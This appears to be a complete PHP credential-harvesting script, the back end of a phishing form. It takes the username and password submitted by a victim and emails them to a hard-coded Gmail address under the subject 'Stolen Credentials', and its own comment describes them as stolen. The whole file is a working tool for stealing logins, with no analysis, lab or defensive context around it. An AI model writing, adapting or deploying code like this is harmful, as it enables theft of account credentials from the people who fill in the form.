<?php
  $username = $_POST['username'];
  $password = $_POST['password'];

  // Send the stolen credentials to your email address
  $to = "v91339441@gmail.com";
  $subject = "Stolen Credentials";
  $message = "Username: " . $username . "\n" . "Password: " . $password;
  $headers = "From: hacked_email@example.com";
  mail($to, $subject, $message, $headers);
?>
